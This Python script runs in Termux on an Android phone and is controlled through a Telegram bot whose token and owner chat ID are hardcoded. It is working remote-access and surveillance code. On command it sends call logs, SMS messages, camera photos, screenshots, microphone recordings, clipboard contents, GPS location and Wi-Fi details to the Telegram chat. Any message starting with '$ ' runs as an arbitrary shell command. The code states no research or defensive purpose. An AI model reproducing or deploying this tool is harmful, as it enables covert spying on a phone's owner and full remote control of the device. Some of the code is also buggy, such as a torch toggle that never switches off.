import subprocess
import json
import requests
import time
import os
import threading

TOKEN = "8834957624:AAFbfeGveFu5xUgbsx7Dyh3YBHJx6cuIjKo"
MY_CHAT_ID = 1674108077
BASE_DIR = "/data/data/com.termux/files/home"

is_recording = False
recording_lock = threading.Lock()
current_recording_process = None

# ================= دالة مركزية للتعامل مع API تليجرام =================
def telegram_api(method, payload=None, files=None):
    url = f"https://api.telegram.org/bot{TOKEN}/{method}"
    try:
        if files:
            response = requests.post(url, data=payload, files=files, timeout=45)
        else:
            response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"API Error ({method}): {e}")
        return None

def send_message(chat_id, text):
    telegram_api("sendMessage", {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})

# ================= قوائم الأزرار التفاعلية =================
def send_main_menu(chat_id, text="✨ *القائمة الرئيسية جاهزة:*"):
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "📱 سجل المكالمات", "callback_data": "/calls"},
                {"text": "🎙️ تسجيل صوتي", "callback_data": "/mic_menu"}
            ],
            [
                {"text": "📸 كاميرا خلفية", "callback_data": "/cam"},
                {"text": "🤳 كاميرا أمامية", "callback_data": "/cam_front"}
            ],
            [
                {"text": "📱 لقطة شاشة", "callback_data": "/screenshot"},
                {"text": "📨 رسائل SMS", "callback_data": "/sms"}
            ],
            [
                {"text": "💡 الكشاف (تشغيل/إيقاف)", "callback_data": "/torch"},
                {"text": "📋 النص المنسوخ", "callback_data": "/clipboard"}
            ],
            [
                {"text": "📶 شبكة الواي فاي", "callback_data": "/wifi"},
                {"text": "🔊 مستوى الصوت", "callback_data": "/volume"}
            ],
            [
                {"text": "📊 حالة الجهاز", "callback_data": "/status"},
                {"text": "🔋 تفاصيل البطارية", "callback_data": "/battery_info"}
            ],
            [
                {"text": "📍 الموقع الجغرافي", "callback_data": "/location"},
                {"text": "🔔 جرس إنذار (Ring)", "callback_data": "/ring"}
            ],
            [
                {"text": "🛑 إيقاف المهمة الحالية", "callback_data": "/cancel"},
                {"text": "🔄 تحديث وتنشيط", "callback_data": "/restart"}
            ]
        ]
    }
    telegram_api("sendMessage", {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown",
        "reply_markup": keyboard
    })

def send_mic_duration_keyboard(chat_id):
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "⏱️ 10 ثوانٍ", "callback_data": "/mic_10"},
                {"text": "⏱️ 20 ثانية", "callback_data": "/mic_20"}
            ],
            [
                {"text": "⏱️ دقيقة (60 ثانية)", "callback_data": "/mic_60"},
                {"text": "⏱️ دقيقتان (120 ثانية)", "callback_data": "/mic_120"}
            ],
            [
                {"text": "⏱️ 5 دقائق (300 ثانية)", "callback_data": "/mic_300"}
            ],
            [
                {"text": "🔙 القائمة الرئيسية", "callback_data": "/start"}
            ]
        ]
    }
    telegram_api("sendMessage", {
        "chat_id": chat_id,
        "text": "🎙️ *اختر مدة التسجيل الصوتي المطلوبة:*",
        "parse_mode": "Markdown",
        "reply_markup": keyboard
    })

# ================= وظائف الميكروفون والصوت =================
def background_mic_task(chat_id, duration_seconds):
    global is_recording, current_recording_process
    audio_path = os.path.join(BASE_DIR, "mic_recording.m4a")

    with recording_lock:
        is_recording = True

    try:
        if os.path.exists(audio_path):
            os.remove(audio_path)

        duration_desc = f"{duration_seconds} ثانية" if duration_seconds < 60 else f"{duration_seconds // 60} دقيقة"
        send_message(chat_id, f"🎙️ جاري التسجيل في الخلفية لمدة *{duration_desc}*...\n💡 يمكنك الضغط على *إيقاف المهمة الحالية* لإنهائه مبكراً.")

        # تشغيل أمر التسجيل في عملية مستقلة
        current_recording_process = subprocess.Popen(
            f"termux-microphone-record -f {audio_path}",
            shell=True
        )

        elapsed = 0
        while elapsed < duration_seconds:
            if not is_recording:
                break
            time.sleep(1)
            elapsed += 1

        # إيقاف عملية التسجيل في Termux
        subprocess.run("termux-microphone-record -q", shell=True)
        if current_recording_process:
            current_recording_process.terminate()
        time.sleep(1)

        # التحقق والإرسال
        if os.path.exists(audio_path) and os.path.getsize(audio_path) > 0:
            send_message(chat_id, "📤 يتم الآن رفع وإرسال الملف الصوتي...")
            with open(audio_path, 'rb') as audio_file:
                telegram_api("sendAudio", payload={"chat_id": chat_id}, files={"audio": audio_file})
            os.remove(audio_path)
        else:
            send_message(chat_id, "⚠️ لم يتم حفظ ملف صوتي صالح (ربما تم الإلغاء مبكراً جداً أو إذن الميكروفون معطل).")

    except Exception as e:
        send_message(chat_id, f"❌ خطأ أثناء التسجيل: {e}")
    finally:
        with recording_lock:
            is_recording = False
            current_recording_process = None
        send_main_menu(chat_id)

def cancel_current_task(chat_id):
    global is_recording, current_recording_process
    if is_recording:
        is_recording = False
        try:
            subprocess.run("termux-microphone-record -q", shell=True)
            if current_recording_process:
                current_recording_process.terminate()
        except:
            pass
        send_message(chat_id, "🛑 تم إلغاء التسجيل الجاري وحفظ الجزء المسجل إن وجد.")
    else:
        send_message(chat_id, "ℹ️ لا توجد مهام جارية لإلغائها.")
    send_main_menu(chat_id)

# ================= وظائف التقارير والنظام =================
def execute_termux_cmd(cmd, is_json=True):
    try:
        result = subprocess.check_output(cmd, shell=True, timeout=15)
        return json.loads(result.decode('utf-8', errors='ignore')) if is_json else result.decode('utf-8', errors='ignore')
    except Exception as e:
        return str(e)

def get_call_logs_report():
    try:
        calls = execute_termux_cmd("termux-call-log -l 10")
        if not isinstance(calls, list) or not calls:
            return "📱 *سجل المكالمات:* لا توجد سجلات متاحة."

        report = "📱 *آخر 10 مكالمات:*\n" + "—" * 20 + "\n\n"
        for idx, call in enumerate(reversed(calls), start=1):
            name = str(call.get('name') or "").strip()
            number = str(call.get('phone_number') or call.get('number') or "").strip()
            
            ignore = ['unknown', 'unknown caller', 'null', 'none', '-1', '']
            if name.lower() in ignore: name = ""
            if number.lower() in ignore: number = ""

            display = f"{name} ({number})" if name and number and name != number else (number or name or "رقم غير مسجل")
            call_type = call.get('type', '')
            type_icon = "↗️ صادرة" if call_type == 'OUTGOING' else ("↙️ واردة" if call_type == 'INCOMING' else "❌ فائتة")

            report += f"*{idx}. {display}*\n   ├ النوع: {type_icon}\n   ├ الوقت: {call.get('date', '')}\n   └ المدة: {call.get('duration', '0')} ثانية\n\n"
        return report
    except Exception as e:
        return f"❌ خطأ: {e}"

def get_sms_report():
    try:
        messages = execute_termux_cmd("termux-sms-list -l 5")
        if not isinstance(messages, list) or not messages:
            return "📨 *الرسائل القصيرة:* لا توجد رسائل."

        report = "📨 *آخر 5 رسائل SMS واردة:*\n" + "—" * 20 + "\n\n"
        for idx, msg in enumerate(messages, start=1):
            report += f"*{idx}. المرسل: {msg.get('number', 'مجهول')}*\n   💬 {msg.get('body', '')}\n   ⏱️ {msg.get('date', '')}\n\n"
        return report
    except Exception as e:
        return f"❌ خطأ: {e}"

def get_device_status():
    data = execute_termux_cmd("termux-battery-status")
    percentage = data.get('percentage', 'N/A') if isinstance(data, dict) else 'N/A'
    status = data.get('status', 'N/A') if isinstance(data, dict) else 'N/A'
    try:
        st = os.statvfs(BASE_DIR)
        free_mb = (st.f_bavail * st.f_frsize) / (1024 * 1024)
    except:
        free_mb = 0.0

    return f"📊 *حالة الجهاز الحالية:*\n—" * 15 + f"\n🔋 النسبة: {percentage}%\n🔌 الحالة: {status}\n💾 المساحة المتاحة: {free_mb:.2f} MB"

def get_battery_info_report():
    data = execute_termux_cmd("termux-battery-status")
    if not isinstance(data, dict):
        return "❌ تعذر جلب بيانات البطارية."
    return f"🔋 *تفاصيل البطارية المتقدمة:*\n—" * 15 + f"\n⚡ النسبة: {data.get('percentage')}%\n🌡️ الحرارة: {data.get('temperature')}°C\n🩺 الصحة: {data.get('health')}\n🔌 المصدر: {data.get('plugged')}"

def get_wifi_report():
    data = execute_termux_cmd("termux-wifi-connectioninfo")
    if not isinstance(data, dict):
        return "❌ تعذر جلب معلومات الواي فاي."
    return f"📶 *معلومات شبكة الواي فاي:*\n—" * 15 + f"\n🌐 SSID: `{data.get('ssid', 'Unknown')}`\n🔗 IP: `{data.get('ip', 'N/A')}`\n📍 BSSID: `{data.get('bssid', 'N/A')}`"

def get_volume_report():
    vols = execute_termux_cmd("termux-volume")
    if not isinstance(vols, list):
        return "❌ تعذر جلب مستويات الصوت."
    report = "🔊 *مستويات الصوت:*\n—" * 15 + "\n"
    for v in vols:
        report += f"🔹 {v.get('stream')}: `{v.get('volume')}/{v.get('max_volume')}`\n"
    return report

def get_location_report():
    try:
        loc = execute_termux_cmd("termux-location -p gps -c 1")
        if isinstance(loc, dict) and loc.get('latitude') and loc.get('longitude'):
            lat, lon = loc.get('latitude'), loc.get('longitude')
            return f"📍 *تم تحديد الموقع بنجاح:*\n🔗 [عرض على خرائط Google](https://maps.google.com/?q={lat},{lon})"
        return "❌ تعذر الحصول على إحداثيات GPS، تأكد من تفعيل الموقع."
    except Exception as e:
        return f"❌ خطأ: {e}"

def get_clipboard_report():
    res = execute_termux_cmd("termux-clipboard-get", is_json=False)
    return f"📋 *النص المنسوخ حالياً:*\n\n`{res}`" if res else "❌ الحافظة فارغة."

def toggle_torch():
    try:
        subprocess.run("termux-torch on", shell=True, timeout=5)
        return "💡 تم تشغيل الكشاف."
    except:
        subprocess.run("termux-torch off", shell=True, timeout=5)
        return "💡 تم إيقاف الكشاف."

def play_ringtone():
    try:
        subprocess.run("termux-media-player play ringtone", shell=True)
        return "🔔 تم تشغيل نغمة الرنين في الجهاز."
    except Exception as e:
        return f"❌ خطأ: {e}"

# ================= وظائف الصور والشاشة =================
def take_media_task(chat_id, media_type, camera_id="0"):
    file_name = "screen.png" if media_type == "screenshot" else f"photo_{camera_id}.jpg"
    file_path = os.path.join(BASE_DIR, file_name)

    if os.path.exists(file_path):
        os.remove(file_path)

    send_message(chat_id, f"⏳ جاري معالجة الطلب ({media_type})...")

    try:
        if media_type == "screenshot":
            subprocess.run(f"termux-screenshot {file_path}", shell=True, check=True, timeout=15)
            method, field = "sendDocument", "document"
        else:
            subprocess.run(f"termux-camera-photo -c {camera_id} {file_path}", shell=True, check=True, timeout=15)
            method, field = "sendPhoto", "photo"

        time.sleep(1)

        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            send_message(chat_id, "📤 يتم الآن الإرسال...")
            with open(file_path, 'rb') as file_data:
                telegram_api(method, payload={"chat_id": chat_id}, files={field: file_data})
            os.remove(file_path)
        else:
            send_message(chat_id, "❌ فشل التقاط الصورة/الشاشة.")
    except Exception as e:
        send_message(chat_id, f"❌ حدث خطأ: {e}")
    finally:
        send_main_menu(chat_id)

def handle_task(chat_id, target_func):
    send_message(chat_id, target_func())
    send_main_menu(chat_id)

# ================= حلقة التشغيل الرئيسية =================
def main():
    print("🤖 البوت يعمل بانتظار الأوامر...")
    send_message(MY_CHAT_ID, "🟢 *تم الاتصال بنجاح!*\nالبوت يعمل الآن بكفاءة ومستعد لاستقبال الأوامر.")
    send_main_menu(MY_CHAT_ID)

    offset = 0

    mic_durations = {
        "/mic_10": 10,
        "/mic_20": 20,
        "/mic_60": 60,
        "/mic_120": 120,
        "/mic_300": 300
    }

    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={offset}&timeout=30"
            res = requests.get(url, timeout=35).json()

            if res.get("ok"):
                for update in res.get("result", []):
                    offset = update["update_id"] + 1
                    chat_id, text = None, ""

                    if "callback_query" in update:
                        cb = update["callback_query"]
                        chat_id = cb["message"]["chat"]["id"]
                        text = cb["data"]
                        telegram_api("answerCallbackQuery", {"callback_query_id": cb["id"]})
                    elif "message" in update:
                        msg = update["message"]
                        chat_id = msg.get("chat", {}).get("id")
                        text = msg.get("text", "").strip()

                    if chat_id == MY_CHAT_ID:
                        # 1. تنفيذ أوامر النظام المباشرة
                        if text.startswith("$ "):
                            cmd = text[2:]
                            send_message(chat_id, "⚙️ جاري التنفيذ...")
                            output = execute_termux_cmd(cmd, is_json=False)
                            send_message(chat_id, f"🖥️ *النتيجة:*\n```\n{output}\n```")

                        # 2. إدارة مهام التسجيل الصوتي
                        elif text == "/mic_menu":
                            if is_recording:
                                send_message(chat_id, "⚠️ الهاتف يسجل حالياً بالفعل!")
                                send_main_menu(chat_id)
                            else:
                                send_mic_duration_keyboard(chat_id)

                        elif text in mic_durations:
                            if is_recording:
                                send_message(chat_id, "⚠️ الهاتف يسجل حالياً بالفعل!")
                                send_main_menu(chat_id)
                            else:
                                secs = mic_durations[text]
                                threading.Thread(target=background_mic_task, args=(chat_id, secs)).start()

                        elif text == "/cancel":
                            cancel_current_task(chat_id)

                        # 3. الكاميرات والشاشة
                        elif text == "/cam":
                            threading.Thread(target=take_media_task, args=(chat_id, "photo", "0")).start()
                        elif text == "/cam_front":
                            threading.Thread(target=take_media_task, args=(chat_id, "photo", "1")).start()
                        elif text == "/screenshot":
                            threading.Thread(target=take_media_task, args=(chat_id, "screenshot")).start()

                        # 4. تقارير النظام والعتاد
                        elif text == "/calls":
                            threading.Thread(target=handle_task, args=(chat_id, get_call_logs_report)).start()
                        elif text == "/sms":
                            threading.Thread(target=handle_task, args=(chat_id, get_sms_report)).start()
                        elif text == "/status":
                            threading.Thread(target=handle_task, args=(chat_id, get_device_status)).start()
                        elif text == "/battery_info":
                            threading.Thread(target=handle_task, args=(chat_id, get_battery_info_report)).start()
                        elif text == "/wifi":
                            threading.Thread(target=handle_task, args=(chat_id, get_wifi_report)).start()
                        elif text == "/volume":
                            threading.Thread(target=handle_task, args=(chat_id, get_volume_report)).start()
                        elif text == "/location":
                            threading.Thread(target=handle_task, args=(chat_id, get_location_report)).start()
                        elif text == "/clipboard":
                            threading.Thread(target=handle_task, args=(chat_id, get_clipboard_report)).start()
                        elif text == "/torch":
                            threading.Thread(target=handle_task, args=(chat_id, toggle_torch)).start()
                        elif text == "/ring":
                            threading.Thread(target=handle_task, args=(chat_id, play_ringtone)).start()

                        # 5. أوامر التشغيل والقائمة
                        elif text in ["/start", "/restart"]:
                            send_main_menu(chat_id)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    main()
